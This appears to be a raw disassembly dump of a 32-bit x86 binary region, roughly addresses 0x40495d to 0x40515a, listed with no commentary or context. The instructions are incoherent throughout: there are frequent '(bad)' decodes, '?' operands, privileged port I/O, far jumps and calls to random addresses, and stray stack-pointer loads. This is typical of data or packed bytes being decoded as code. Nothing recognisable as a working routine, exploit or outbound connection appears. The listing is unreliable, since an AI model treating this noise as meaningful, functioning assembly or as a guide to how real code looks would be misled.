  40495d:	shl    esp,0xab
  404960:	outs   dx,DWORD PTR ds:[esi]
  404961:	xchg   edx,eax
  404962:	outs   dx,BYTE PTR ds:[esi]
  404963:	push   ss
  404964:	stc    
  404965:	mov    dl,0xa1
  404967:	sub    eax,0x39c84268
  40496c:	sub    dh,dl
  40496e:	push   eax
  40496f:	or     BYTE PTR [edx-0x17068c2d],ch
  404975:	pop    ebx
  404976:	mov    esp,0x29f2ce2a
  40497b:	jae    0x4049ca
  40497d:	xchg   ecx,eax
  40497e:	or     ch,BYTE PTR [edx-0x73d2bdec]
  404984:	ins    BYTE PTR es:[edi],dx
  404985:	ret    
  404986:	xchg   BYTE PTR [ebx-0x7c8a4814],cl
  40498c:	ins    BYTE PTR es:[edi],dx
  40498d:	lock mov eax,ds:0x490e62ee
  404993:	mov    esi,0x8ff81a6c
  404998:	stos   DWORD PTR es:[edi],eax
  404999:	jg     0x40493a
  40499b:	dec    ecx
  40499c:	jae    0x404998
  40499e:	mov    al,ah
  4049a0:	mov    ah,ah
  4049a2:	xor    DWORD PTR [ecx+ebp*1],edx
  4049a5:	les    esi,FWORD PTR [esi+0xc]
  4049a8:	jb     0x404946
  4049aa:	push   ds
  4049ab:	mov    WORD PTR [ecx],gs
  4049ad:	mov    ds:0x7b9fef7e,al
  4049b2:	test   DWORD PTR [edx+0x4db7fe5d],edi
  4049b8:	imul   esi
  4049ba:	xchg   ebp,eax
  4049bb:	aam    0x47
  4049bd:	imul   ecx,DWORD PTR [eax+esi*2-0xc52ee06],0x498b9ae2
  4049c8:	sbb    eax,0x402c7beb
  4049cd:	cmp    eax,0xaf244531
  4049d2:	xchg   ebx,eax
  4049d3:	sbb    edx,esp
  4049d5:	adc    eax,0x8e8288f9
  4049da:	clc    
  4049db:	fbld   TBYTE PTR ds:0xc334cf4f
  4049e1:	sub    DWORD PTR [edi+0x48e5be83],ebx
  4049e7:	mov    esi,0x36929bf
  4049ec:	inc    edi
  4049ed:	sbb    DWORD PTR [edi+0x3b0a9af0],0x26
  4049f4:	test   al,0xac
  4049f6:	daa    
  4049f7:	adc    cl,bl
  4049f9:	cdq    
  4049fa:	fs add eax,0xdc31e089
  404a00:	fcom   st(6)
  404a02:	mov    ah,0x7d
  404a04:	mov    eax,ds:0x9520662f
  404a09:	mov    BYTE PTR [edi+edi*1],dh
  404a0c:	fist   WORD PTR [eax-0x7c]
  404a0f:	cli    
  404a10:	mov    esp,0xbd073bf1
  404a15:	ss jno 0x4049a9
  404a18:	aaa    
  404a19:	leave  
  404a1a:	adc    bh,BYTE PTR [esi+0x40]
  404a1d:	jno    0x4049a6
  404a1f:	or     cl,BYTE PTR [esp+esi*8]
  404a22:	mov    esp,0x91150cbb
  404a27:	(bad)  
  404a28:	mov    al,ds:0xfbf8af34
  404a2d:	div    BYTE PTR [esi+0x76dc42ae]
  404a33:	call   0xae2c27e5
  404a38:	(bad)  [eax+edi*4]
  404a3b:	push   ecx
  404a3c:	call   0x9d6c:0xbc90ea86
  404a43:	pop    ecx
  404a44:	sub    ecx,edi
  404a46:	es addr16 pop esi
  404a49:	pop    esi
  404a4a:	mov    bl,0xd2
  404a4c:	sub    eax,0xd71f14
  404a51:	push   ss
  404a52:	in     al,dx
  404a53:	in     al,0x7a
  404a55:	lahf   
  404a56:	xlat   BYTE PTR ds:[ebx]
  404a57:	pop    ss
  404a58:	in     al,0x26
  404a5a:	aam    0xbe
  404a5c:	push   ecx
  404a5d:	cmp    eax,0x39f7cc1b
  404a62:	jns    0x404a64
  404a64:	fnsave [edi-0x6c]
  404a67:	in     eax,0xd2
  404a69:	mov    al,ds:0x5f04324c
  404a6e:	push   0x23056ea7
  404a73:	sbb    al,BYTE PTR [edi-0xd]
  404a76:	cmp    ecx,DWORD PTR [edx-0x5e]
  404a79:	xchg   ecx,eax
  404a7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a7b:	mov    esp,?
  404a7d:	sub    al,0xc9
  404a7f:	leave  
  404a80:	mov    ecx,0x3a27e378
  404a85:	mov    ebx,0xeb1a4c84
  404a8a:	ret    0xc523
  404a8d:	aas    
  404a8e:	rol    BYTE PTR [ecx*8-0x716d69f5],1
  404a95:	sti    
  404a96:	sub    ecx,eax
  404a98:	xor    eax,0xeecc0aa8
  404a9d:	retf   0x1030
  404aa0:	fcomp  QWORD PTR [eax]
  404aa2:	lods   al,BYTE PTR ds:[esi]
  404aa3:	mov    esp,0xf3785400
  404aa8:	push   edi
  404aa9:	sbb    BYTE PTR [ebx+0x2cb8ceb0],bh
  404aaf:	jbe    0x404ac7
  404ab1:	std    
  404ab2:	inc    edx
  404ab3:	shr    DWORD PTR [ebx+0x53effaa9],0x1b
  404aba:	mov    bl,0xcd
  404abc:	es loopne 0x404aad
  404abf:	xor    DWORD PTR [ecx+0x6d809e01],ebp
  404ac5:	stc    
  404ac6:	inc    esp
  404ac7:	fsubr  DWORD PTR [ebp+0x4ef3b2d9]
  404acd:	xchg   ebp,eax
  404ace:	loope  0x404ac8
  404ad0:	test   eax,0xa058751a
  404ad5:	sbb    BYTE PTR [ecx-0x3e],0xfe
  404ad9:	lds    ebx,FWORD PTR [eax+0x44]
  404adc:	sbb    DWORD PTR [edx+0x6],edx
  404adf:	add    DWORD PTR [edx],ebx
  404ae1:	cmp    dl,BYTE PTR [esi]
  404ae3:	pop    edx
  404ae4:	es cmp eax,0x16958063
  404aea:	out    dx,eax
  404aeb:	xor    al,0x52
  404aed:	adc    BYTE PTR [ecx+0x7dc605f6],0x87
  404af4:	sbb    DWORD PTR [ecx-0x3448f537],esp
  404afa:	ss das 
  404afc:	sub    DWORD PTR [ecx+0x54],ebp
  404aff:	sti    
  404b00:	cmc    
  404b01:	mov    ch,0xd3
  404b03:	add    DWORD PTR [ebx-0x4ec43587],esp
  404b09:	fld    QWORD PTR [edx+ecx*2]
  404b0c:	sahf   
  404b0d:	push   0x47
  404b0f:	sar    eax,cl
  404b11:	add    edx,DWORD PTR [eax-0x7ab356d3]
  404b17:	or     BYTE PTR [ecx+ecx*4+0x20],dl
  404b1b:	mov    esp,0x2b7785a6
  404b20:	cmp    dh,al
  404b22:	rcl    bl,cl
  404b24:	in     eax,0xc9
  404b26:	add    al,BYTE PTR [ecx-0x6ec07757]
  404b2c:	repnz or dh,BYTE PTR [ebp-0x6ec8d302]
  404b33:	dec    edi
  404b34:	adc    eax,0xbf15c5b3
  404b39:	mov    ah,0x50
  404b3b:	ret    
  404b3c:	inc    edx
  404b3d:	add    al,0x89
  404b3f:	sub    al,0xf4
  404b41:	adc    DWORD PTR ds:0x422a667c,edx
  404b47:	mov    ?,WORD PTR ds:0x23a924ca
  404b4d:	icebp  
  404b4e:	push   esp
  404b4f:	add    edi,esp
  404b51:	jbe    0x404b2e
  404b53:	sbb    al,0x8c
  404b55:	inc    esp
  404b56:	std    
  404b57:	jb     0x404af2
  404b59:	and    DWORD PTR [ebx-0x2acbc646],0x5
  404b60:	cmp    eax,0x94646178
  404b65:	push   es
  404b66:	in     eax,dx
  404b67:	sbb    eax,0xef6aaefc
  404b6c:	ss push ebp
  404b6e:	mov    cl,0x33
  404b70:	adc    dh,BYTE PTR [esp+edi*2+0x207aff23]
  404b77:	retf   
  404b78:	mov    WORD PTR [esi-0x66],?
  404b7b:	jne    0x404b40
  404b7d:	retf   
  404b7e:	dec    esp
  404b7f:	xchg   edi,eax
  404b80:	xchg   edx,eax
  404b81:	scas   eax,DWORD PTR es:[edi]
  404b82:	outs   dx,DWORD PTR ds:[esi]
  404b83:	inc    esp
  404b84:	ins    DWORD PTR es:[edi],dx
  404b85:	not    ah
  404b87:	jno    0x404bcb
  404b89:	sbb    eax,0xbed13d3d
  404b8e:	lods   eax,DWORD PTR ds:[esi]
  404b8f:	xor    ecx,DWORD PTR [eax]
  404b91:	jno    0x404be2
  404b93:	lods   al,BYTE PTR ds:[esi]
  404b94:	std    
  404b95:	push   ebp
  404b96:	shl    bl,1
  404b98:	sbb    esp,ebp
  404b9a:	push   ds
  404b9b:	jmp    0xfa39:0x6a744d1a
  404ba2:	popf   
  404ba3:	test   eax,0xdb18352e
  404ba8:	add    eax,ecx
  404baa:	or     eax,0x75d9c5d7
  404baf:	mov    ebp,0x2a3a154a
  404bb4:	call   0x9855ab36
  404bb9:	push   esp
  404bba:	xlat   BYTE PTR ds:[ebx]
  404bbb:	pop    esi
  404bbc:	loopne 0x404bd6
  404bbe:	retf   
  404bbf:	es into 
  404bc1:	pop    eax
  404bc2:	fwait
  404bc3:	inc    esi
  404bc4:	aam    0x2f
  404bc6:	stc    
  404bc7:	in     eax,dx
  404bc8:	push   edi
  404bc9:	jp     0x404be1
  404bcb:	outs   dx,BYTE PTR ds:[esi]
  404bcc:	outs   dx,DWORD PTR ds:[esi]
  404bcd:	es pop ebp
  404bcf:	cmp    eax,edx
  404bd1:	adc    al,0x72
  404bd3:	popf   
  404bd4:	pushf  
  404bd5:	xchg   esp,edx
  404bd7:	add    eax,0x4eb0bca3
  404bdc:	mov    WORD PTR [ebp-0x3a],ds
  404bdf:	pop    es
  404be0:	dec    eax
  404be1:	pop    esp
  404be2:	(bad)  
  404be3:	mov    ds:0xafaa35d8,eax
  404be8:	ins    DWORD PTR es:[edi],dx
  404be9:	imul   edi,DWORD PTR [ecx-0x489a468f],0xbdae8628
  404bf3:	cmp    edx,esp
  404bf5:	sahf   
  404bf6:	in     eax,0xa0
  404bf8:	pop    ss
  404bf9:	push   cs
  404bfa:	xchg   edi,eax
  404bfb:	retf   
  404bfc:	hlt    
  404bfd:	sbb    DWORD PTR [edx],ebx
  404bff:	dec    edi
  404c00:	aam    0xa1
  404c02:	push   ebp
  404c03:	inc    ebx
  404c04:	ins    DWORD PTR es:[edi],dx
  404c05:	and    eax,0x9b50eefd
  404c0a:	aam    0x8f
  404c0c:	lods   eax,DWORD PTR ds:[esi]
  404c0d:	out    dx,eax
  404c0e:	adc    DWORD PTR [eax],esi
  404c10:	dec    edi
  404c11:	xchg   edi,eax
  404c12:	es nop
  404c14:	cmp    DWORD PTR [ecx+edi*8-0x4d7fc489],0xffffffee
  404c1c:	in     al,dx
  404c1d:	loope  0x404c10
  404c1f:	mov    cl,0x71
  404c21:	push   0x30
  404c23:	mov    dl,BYTE PTR ss:[ebx-0x68]
  404c27:	ret    
  404c28:	jl     0x404c75
  404c2a:	lea    esi,[ecx+0x7c332d79]
  404c30:	add    BYTE PTR [edx-0x108c0756],dl
  404c36:	and    eax,0x7eb25d55
  404c3b:	and    DWORD PTR [eax-0x78],esi
  404c3e:	xchg   eax,esi
  404c40:	rol    BYTE PTR [ecx-0x48],1
  404c43:	adc    eax,0xfd4cd96e
  404c48:	xchg   ebx,eax
  404c49:	lahf   
  404c4a:	sti    
  404c4b:	push   esp
  404c4c:	fwait
  404c4d:	xchg   ebx,eax
  404c4e:	fisub  DWORD PTR [ecx]
  404c50:	stos   BYTE PTR es:[edi],al
  404c51:	pop    edi
  404c52:	inc    esi
  404c53:	pop    esi
  404c54:	jmp    0x60ed6def
  404c59:	dec    eax
  404c5a:	xchg   ebx,eax
  404c5b:	retf   0xaf9d
  404c5e:	mov    bl,0x23
  404c60:	ret    
  404c61:	ds ins DWORD PTR es:[edi],dx
  404c63:	mov    dh,0x26
  404c65:	sub    ecx,ebp
  404c67:	sbb    DWORD PTR [eax-0x6b],ebp
  404c6a:	test   DWORD PTR [edi],edx
  404c6c:	ss ja  0x404c46
  404c6f:	push   ebp
  404c70:	fwait
  404c71:	cs gs icebp 
  404c74:	and    ebp,esi
  404c76:	repnz xor al,0x67
  404c79:	inc    esp
  404c7a:	int    0xf6
  404c7c:	loopne 0x404c9c
  404c7e:	int3   
  404c7f:	inc    ebp
  404c80:	out    0xf7,al
  404c82:	js     0x404cd3
  404c84:	loope  0x404c7e
  404c86:	std    
  404c87:	cs shl al,0xbc
  404c8b:	gs inc edx
  404c8d:	jbe    0x404c15
  404c8f:	inc    edx
  404c90:	add    esi,0xa0c8d9b7
  404c96:	xor    dh,ah
  404c98:	les    esi,FWORD PTR [ecx]
  404c9a:	call   0x8b15aa46
  404c9f:	mov    bl,0xf9
  404ca1:	ins    DWORD PTR es:[edi],dx
  404ca2:	gs pop ecx
  404ca4:	xor    al,0x6
  404ca6:	add    al,0x78
  404ca8:	xor    DWORD PTR [edi-0x5b],edi
  404cab:	shl    DWORD PTR [eax],0xa2
  404cae:	loop   0x404cc0
  404cb0:	pop    ds
  404cb1:	or     ebx,ebp
  404cb3:	rcl    BYTE PTR [eax],1
  404cb5:	shl    DWORD PTR [esi-0x4d923d49],0x96
  404cbc:	pusha  
  404cbd:	mov    edi,0x713b3fc6
  404cc2:	xlat   BYTE PTR ds:[ebx]
  404cc3:	call   FWORD PTR [eax+esi*2+0x24e6fa94]
  404cca:	mov    al,0x29
  404ccc:	ins    BYTE PTR es:[edi],dx
  404ccd:	ins    DWORD PTR es:[edi],dx
  404cce:	rol    BYTE PTR ds:0x5cfcd3e8,cl
  404cd4:	xor    ebp,ecx
  404cd6:	ins    BYTE PTR es:[edi],dx
  404cd7:	mov    esi,ss
  404cd9:	pop    ebp
  404cda:	mov    WORD PTR [esi-0x2780c8b9],es
  404ce0:	fnstsw WORD PTR [edx-0x80]
  404ce3:	jp     0x404d08
  404ce5:	inc    ecx
  404ce6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ce7:	daa    
  404ce8:	xor    al,0xa9
  404cea:	sub    eax,0xe04115aa
  404cef:	stc    
  404cf0:	repz mov ah,0xd3
  404cf3:	push   0xe52c39fd
  404cf8:	loope  0x404cec
  404cfa:	cmp    BYTE PTR es:0xe9e3131d,0xf
  404d02:	in     al,dx
  404d03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d04:	jne    0x404ca3
  404d06:	ja     0x404d67
  404d08:	clc    
  404d09:	mov    eax,ds:0x8aa36ed6
  404d0e:	repz imul edx,DWORD PTR [ebp-0x1b6449a3],0x45
  404d16:	mov    eax,0xa032bf1e
  404d1b:	adc    ch,0x58
  404d1e:	sbb    al,BYTE PTR [ebp+0x2]
  404d21:	xor    eax,0xe42b0227
  404d26:	clc    
  404d27:	mov    BYTE PTR [edi],ah
  404d29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d2a:	xchg   ecx,eax
  404d2b:	(bad)  
  404d2c:	jmp    0xa93a:0xcf9c2e7c
  404d33:	scas   al,BYTE PTR es:[edi]
  404d34:	fucomp st(1)
  404d36:	mov    edx,0xf191c32d
  404d3b:	retf   
  404d3c:	in     al,0x48
  404d3e:	scas   eax,DWORD PTR es:[edi]
  404d3f:	popa   
  404d40:	adc    eax,0x219ee10a
  404d45:	std    
  404d46:	out    0xb2,al
  404d48:	inc    esi
  404d49:	dec    edi
  404d4a:	jle    0x404db6
  404d4c:	sti    
  404d4d:	ins    BYTE PTR es:[edi],dx
  404d4e:	fsub   QWORD PTR [ebx]
  404d50:	ds stos BYTE PTR es:[edi],al
  404d52:	push   edx
  404d53:	xchg   edi,eax
  404d54:	shl    BYTE PTR [ebp+0x5a74a8f7],0xf0
  404d5b:	mov    ebx,0x36bd7b
  404d60:	sbb    eax,0x532989d6
  404d65:	xor    bl,BYTE PTR [edx+0x5]
  404d68:	loop   0x404d79
  404d6a:	mov    bl,0xe9
  404d6c:	dec    eax
  404d6d:	shr    ebp,1
  404d6f:	xchg   edx,eax
  404d70:	sar    DWORD PTR [ecx-0x414cc9a2],0x11
  404d77:	pop    ds
  404d78:	int3   
  404d79:	xor    BYTE PTR [esi],dl
  404d7b:	in     al,0x94
  404d7d:	sub    ebx,DWORD PTR [ebx+edi*1-0x57]
  404d81:	popa   
  404d82:	out    0x2b,eax
  404d84:	lods   eax,DWORD PTR ds:[esi]
  404d85:	imul   ebx,DWORD PTR [edx+0x75],0xaa53c7af
  404d8c:	mov    dl,0x50
  404d8e:	(bad)  
  404d8f:	mov    edx,0x21d48cc6
  404d94:	inc    ebx
  404d95:	scas   al,BYTE PTR es:[edi]
  404d96:	(bad)  
  404d97:	mov    bl,0xd6
  404d99:	adc    eax,0xdfc61621
  404d9e:	xor    eax,0x5b8c1128
  404da3:	fwait
  404da4:	adc    BYTE PTR [edi+edi*8+0x41],ah
  404da8:	shr    BYTE PTR [edi*8+0x79cbdd45],1
  404daf:	cmp    cl,ah
  404db1:	js     0x404db3
  404db3:	and    al,0x73
  404db5:	push   ss
  404db6:	fsubr  st,st(0)
  404db8:	dec    ecx
  404db9:	jle    0x404da3
  404dbb:	pop    eax
  404dbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404dbd:	lock fldenv [edx]
  404dc0:	gs inc ecx
  404dc2:	xchg   edx,eax
  404dc3:	int    0x6b
  404dc5:	pop    es
  404dc6:	lock and DWORD PTR [ebx-0x7d79ca0f],esp
  404dcd:	sbb    ch,BYTE PTR [edi-0x36]
  404dd0:	mov    edi,0xf65c5f43
  404dd5:	call   0x339d42d7
  404dda:	jmp    0xf5858c78
  404ddf:	sub    DWORD PTR [esp+esi*4],ebx
  404de2:	sub    BYTE PTR [esi],dh
  404de4:	cli    
  404de5:	hlt    
  404de6:	sbb    BYTE PTR ds:0xb07f6416,al
  404dec:	inc    esp
  404ded:	retf   
  404dee:	(bad)
  404df2:	pop    ebp
  404df3:	outs   dx,DWORD PTR ds:[esi]
  404df4:	cmp    DWORD PTR [edx-0x34],ebp
  404df7:	cwde   
  404df8:	push   es
  404df9:	mov    ebp,DWORD PTR [ebx+0x1a]
  404dfc:	mov    ecx,0xa227b5b6
  404e01:	and    ebp,DWORD PTR [ecx]
  404e03:	mov    edi,0x997fd354
  404e08:	xor    esp,DWORD PTR [edx+0x7ea82ba4]
  404e0e:	mov    ebx,0xe4546e46
  404e13:	jge    0x404e23
  404e15:	repnz fbstp TBYTE PTR ds:0x5bee240a
  404e1c:	outs   dx,BYTE PTR ds:[esi]
  404e1d:	out    0xff,al
  404e1f:	pop    ebx
  404e20:	inc    edx
  404e21:	jmp    FWORD PTR [eax]
  404e23:	add    eax,0xf7e5b38
  404e28:	sbb    al,0x9a
  404e2a:	inc    ebp
  404e2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e2c:	(bad)  
  404e2d:	fidivr WORD PTR [edx]
  404e2f:	rol    DWORD PTR [ebx+ebp*4],0x2d
  404e33:	push   es
  404e34:	adc    esp,ecx
  404e36:	fcom   QWORD PTR [edi]
  404e38:	cmp    eax,0xb87693d4
  404e3d:	jge    0x404e18
  404e3f:	aaa    
  404e40:	in     eax,dx
  404e41:	mov    esp,0x8eab3425
  404e46:	jmp    0xe8f8:0x15bec2d3
  404e4d:	xchg   esp,eax
  404e4e:	ret    0x6e70
  404e51:	call   0x79a0f334
  404e56:	mov    gs,WORD PTR [ecx-0x62]
  404e59:	xor    BYTE PTR [eax+0x788710fd],dh
  404e5f:	mov    ds:0x5189e8c5,al
  404e64:	repz jecxz 0x404e91
  404e67:	mov    cl,0xfc
  404e69:	or     eax,0xbb537320
  404e6e:	pop    ebx
  404e6f:	in     al,0x20
  404e71:	and    ebx,esp
  404e73:	data16 hlt 
  404e75:	mov    esp,0x3ee2e928
  404e7a:	fadd   st,st(7)
  404e7c:	mov    ah,0xf7
  404e7e:	pop    ecx
  404e7f:	ds inc esi
  404e81:	iret   
  404e82:	pop    eax
  404e83:	std    
  404e84:	out    0x76,eax
  404e86:	ror    DWORD PTR [ecx-0x133772c3],1
  404e8c:	fs std 
  404e8e:	fld    st(0)
  404e90:	stos   DWORD PTR es:[edi],eax
  404e91:	out    dx,eax
  404e92:	cli    
  404e93:	push   0xe716f58b
  404e98:	mov    edx,0x49c548cc
  404e9d:	push   0x7e104e06
  404ea2:	pop    ds
  404ea3:	jmp    0x8e60:0x3a872c26
  404eaa:	ins    BYTE PTR es:[edi],dx
  404eab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404eac:	ss jne 0x404e74
  404eaf:	repnz daa 
  404eb1:	stos   BYTE PTR es:[edi],al
  404eb2:	lea    eax,[ebp+0x57]
  404eb5:	iret   
  404eb6:	cmp    eax,0xc29a8f7b
  404ebb:	scas   eax,DWORD PTR es:[edi]
  404ebc:	push   ebp
  404ebd:	lahf   
  404ebe:	cmp    dh,BYTE PTR [ebp+0x41]
  404ec1:	jo     0x404edd
  404ec3:	sub    eax,0x56ee9c5d
  404ec8:	cwde   
  404ec9:	mov    ecx,0xc84f5d26
  404ece:	rcl    esi,0x16
  404ed1:	data16 not BYTE PTR [esi-0x201f3289]
  404ed8:	and    ecx,DWORD PTR [esi-0x78]
  404edb:	dec    ebp
  404edc:	mov    edi,0x5d3cee96
  404ee1:	mov    ds:0xcbfe2f7d,eax
  404ee6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ee7:	dec    eax
  404ee8:	lods   eax,DWORD PTR ds:[esi]
  404ee9:	test   al,0xc6
  404eeb:	aad    0x14
  404eed:	leave  
  404eee:	jge    0x404f05
  404ef0:	xor    ax,0xbbda
  404ef4:	retf   0x9c82
  404ef7:	(bad)  
  404ef8:	cmp    BYTE PTR [edi],al
  404efa:	clc    
  404efb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404efc:	sbb    edx,DWORD PTR [ecx+0xdac5934]
  404f02:	sahf   
  404f03:	dec    eax
  404f04:	loop   0x404ef0
  404f06:	cwde   
  404f07:	fsub   DWORD PTR [esi]
  404f09:	pop    es
  404f0a:	sub    ecx,esp
  404f0c:	push   0x7d
  404f0e:	dec    edi
  404f0f:	and    eax,0xc4189aa4
  404f14:	cmc    
  404f15:	scas   eax,DWORD PTR es:[edi]
  404f16:	call   DWORD PTR [edx-0x58]
  404f19:	add    ebp,DWORD PTR [edx-0x65]
  404f1c:	aad    0x5c
  404f1e:	and    BYTE PTR [edi-0x7a],bl
  404f21:	jmp    0xd4f8efc4
  404f26:	int3   
  404f27:	out    dx,eax
  404f28:	retf   
  404f29:	cmp    al,0x7b
  404f2b:	pop    ds
  404f2c:	xchg   DWORD PTR [esi+0x1],esp
  404f2f:	sub    al,0xb3
  404f31:	mov    al,ds:0x6379e89d
  404f36:	sbb    eax,0xc99ddee
  404f3b:	js     0x404ec0
  404f3d:	or     BYTE PTR [esi+edx*4+0x2f],dl
  404f41:	and    dl,BYTE PTR [edi+0x8]
  404f44:	jecxz  0x404f8d
  404f46:	jne    0x404fa7
  404f48:	pop    es
  404f49:	inc    edi
  404f4a:	loope  0x404fbb
  404f4c:	repz daa 
  404f4e:	mov    eax,ds:0x6361ed5e
  404f53:	lods   eax,DWORD PTR ds:[esi]
  404f54:	cmp    BYTE PTR [esi+esi*4+0x4d655312],0x8
  404f5c:	mov    ch,0x3a
  404f5e:	xlat   BYTE PTR ds:[ebx]
  404f5f:	mov    esp,0xdd31f636
  404f64:	je     0x404fa0
  404f66:	and    ecx,DWORD PTR [ecx-0x4b]
  404f69:	push   ebx
  404f6a:	or     DWORD PTR ds:0x424ff1d2,ebx
  404f70:	cmp    BYTE PTR [edi],dh
  404f72:	call   0x7dba:0x2292ea6
  404f79:	dec    esp
  404f7a:	repnz sbb DWORD PTR [ebp-0x1ee431e],0xaf013b99
  404f85:	fs or  eax,0xe5ebb535
  404f8b:	push   ecx
  404f8c:	or     al,0xf0
  404f8e:	js     0x404ffe
  404f90:	or     esi,esp
  404f92:	(bad)  
  404f93:	rcl    BYTE PTR [edi],1
  404f95:	mov    esp,0xb0e9d0c8
  404f9a:	or     dl,ch
  404f9c:	add    eax,0x810cf548
  404fa1:	ins    DWORD PTR es:[edi],dx
  404fa2:	xchg   esp,eax
  404fa3:	mov    ebp,0x545a26e3
  404fa8:	imul   ecx,DWORD PTR [ebp+0x4],0xae859dc0
  404faf:	mov    esp,0x462ef7d1
  404fb4:	ror    BYTE PTR [edi*4+0x4f94f9da],cl
  404fbb:	mov    ebx,0xecdc1cc6
  404fc0:	mov    dh,0x63
  404fc2:	hlt    
  404fc3:	ds pause 
  404fc6:	ins    BYTE PTR es:[edi],dx
  404fc7:	mov    ebx,0x20a23813
  404fcc:	cli    
  404fcd:	push   edx
  404fce:	adc    edx,DWORD PTR [ebx-0x4787bcf]
  404fd4:	bound  edi,QWORD PTR [edx+ebp*1]
  404fd7:	mov    al,ds:0x609080c5
  404fdc:	push   esp
  404fdd:	repz add eax,DWORD PTR [ebp-0x61]
  404fe1:	ret    0xb0fe
  404fe4:	dec    edx
  404fe5:	iret   
  404fe6:	std    
  404fe7:	je     0x404fe4
  404fe9:	or     al,BYTE PTR [edi+esi*8]
  404fec:	jmp    0xefbc4344
  404ff1:	pop    ds
  404ff2:	or     BYTE PTR [esi-0x5205a3d7],dh
  404ff8:	jg     0x404f7d
  404ffa:	inc    edi
  404ffb:	mov    cl,0xd
  404ffd:	pop    edx
  404ffe:	push   ebp
  404fff:	and    ah,BYTE PTR [ecx-0x13]
  405002:	xchg   DWORD PTR [ebp+0x3c],ebp
  405005:	add    BYTE PTR [esi-0x52],dh
  405008:	push   0x16b806d6
  40500d:	and    dl,BYTE PTR [edx+ebx*1+0x1464a11c]
  405014:	aad    0xe9
  405016:	and    bh,BYTE PTR [ecx+0x3]
  405019:	aad    0x7b
  40501b:	xchg   edx,eax
  40501c:	adc    DWORD PTR [eax],edi
  40501e:	xor    al,0x80
  405020:	adc    cl,BYTE PTR [edx+edx*8-0x68]
  405024:	xchg   esi,eax
  405025:	cmp    al,0x1d
  405027:	or     dl,BYTE PTR [eax]
  405029:	or     cl,cl
  40502b:	les    esp,FWORD PTR [ebx+0x50]
  40502e:	daa    
  40502f:	adc    DWORD PTR [esi],0x70
  405032:	or     DWORD PTR [edi],0xffffffdf
  405035:	mov    eax,0x426168e1
  40503a:	stc    
  40503b:	dec    ebx
  40503c:	push   esp
  40503d:	es in  eax,0xf1
  405040:	repnz push 0x71
  405043:	xor    eax,0x9986b62c
  405048:	adc    BYTE PTR [edi+0x72588a9e],dl
  40504e:	hlt    
  40504f:	cmp    eax,0xf99afd86
  405054:	bound  ecx,QWORD PTR [edi-0x5c]
  405057:	jmp    0xb5c9:0xdac616e7
  40505e:	imul   BYTE PTR [esi+0x31]
  405061:	add    al,0x46
  405063:	mov    ebp,0xd781eb46
  405068:	repnz dec esp
  40506a:	dec    eax
  40506b:	push   eax
  40506c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40506d:	jge    0x405014
  40506f:	sar    BYTE PTR [edx+0x3],0x5f
  405073:	and    edi,DWORD PTR [ecx-0x56]
  405076:	pop    es
  405077:	in     eax,0xd2
  405079:	test   DWORD PTR [edi],edx
  40507b:	dec    edi
  40507c:	bswap  ebp
  40507e:	push   ds
  40507f:	ins    BYTE PTR es:[edi],dx
  405080:	stos   BYTE PTR es:[edi],al
  405081:	cmp    cl,BYTE PTR [edx+ebp*2+0x4f727ad4]
  405088:	xor    eax,DWORD PTR ds:0xc99893cd
  40508e:	and    BYTE PTR [eax-0x5625c63d],0x95
  405095:	sbb    al,0x7f
  405097:	mov    ds:0x331cc1e2,eax
  40509c:	leave  
  40509d:	sbb    al,bl
  40509f:	cwde   
  4050a0:	fincstp 
  4050a2:	sub    ebx,DWORD PTR [ebx-0x473996b3]
  4050a8:	loop   0x405057
  4050aa:	pop    eax
  4050ab:	cmp    al,0x8c
  4050ad:	push   0xffffffa7
  4050af:	in     al,dx
  4050b0:	jae    0x4050b4
  4050b2:	mov    al,ds:0xaea7523a
  4050b7:	lds    ecx,FWORD PTR [ebx]
  4050b9:	int    0xb2
  4050bb:	sahf   
  4050bc:	sub    esi,DWORD PTR [esi+ebp*8]
  4050bf:	int    0x24
  4050c1:	cmp    edx,ebx
  4050c3:	and    DWORD PTR [edx-0x5ced94f1],0xf
  4050ca:	leave  
  4050cb:	repz aad 0x60
  4050ce:	xchg   edx,eax
  4050cf:	xor    BYTE PTR [ebp-0x30cf645f],bl
  4050d5:	arpl   WORD PTR [edi+0x0],ax
  4050d8:	sbb    al,0xb1
  4050da:	jp     0x405139
  4050dc:	or     al,0x75
  4050de:	xchg   edx,eax
  4050df:	mov    cl,al
  4050e1:	out    0xd2,eax
  4050e3:	pop    edi
  4050e4:	mov    ch,BYTE PTR [edx+0x240dd18e]
  4050ea:	or     DWORD PTR [edx-0xcc014f8],ebx
  4050f0:	inc    edx
  4050f1:	and    bl,ch
  4050f3:	out    dx,eax
  4050f4:	jmp    0xf76c2526
  4050f9:	rcl    BYTE PTR [ebx+0xa],0xa1
  4050fd:	hlt    
  4050fe:	sahf   
  4050ff:	test   eax,0xac42b9e
  405104:	add    DWORD PTR [esi],0xffffffaf
  405107:	mov    ecx,0xd5cc814f
  40510c:	call   0xae68fa5f
  405111:	or     BYTE PTR ds:0xb8f62aec,dh
  405117:	sbb    al,0x97
  405119:	test   DWORD PTR [eax-0x66],edx
  40511c:	or     eax,0x45e1c71c
  405121:	(bad)  
  405122:	daa    
  405123:	clc    
  405124:	push   edi
  405125:	jmp    0x40514c
  405127:	push   cs
  405128:	xor    dh,dl
  40512a:	int3   
  40512b:	daa    
  40512c:	std    
  40512d:	in     eax,dx
  40512e:	aam    0xdf
  405130:	nop
  405131:	mov    BYTE PTR ds:0x4d8eb7f7,bl
  405137:	push   ebx
  405138:	lea    esi,[ebp+0x776a6211]
  40513e:	sbb    eax,0x5b0f137f
  405143:	adc    al,0xb2
  405145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405146:	cld    
  405147:	daa    
  405148:	push   ebx
  405149:	xchg   cl,ah
  40514b:	out    0x57,al
  40514d:	cld    
  40514e:	or     BYTE PTR [ecx],dl
  405150:	(bad)  
  405151:	pusha  
  405152:	sar    DWORD PTR gs:[esi+0xa14c14f],0x8a
  40515a:	test   al,0x46
